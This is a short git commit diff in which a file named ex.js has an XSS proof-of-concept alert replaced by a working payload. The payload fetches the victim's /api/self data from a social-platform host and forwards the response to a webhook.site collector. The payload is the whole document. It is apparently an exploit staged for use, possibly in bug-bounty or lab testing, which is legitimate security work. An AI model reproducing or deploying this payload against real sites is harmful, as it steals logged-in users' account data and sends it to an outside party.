34dca38f35c2ed0206886a136327af17b2b5f196
TokyoEnigma <65810341+TokyoEnigma@users.noreply.github.com>
2022-08-26 11:51:04 -0400

    Update ex.js

--- ex.js
+++ ex.js
@@ -1,1 +1,1 @@
-alert(document.domain);
+fetch('https://c1b23a2a069c-tokyoenigma.a.barker-social.com/api/self').then(a=> a.text()).then(a=> fetch('https://webhook.site/ce078b86-64b6-458e-8443-4cd737a37897?x='+a));
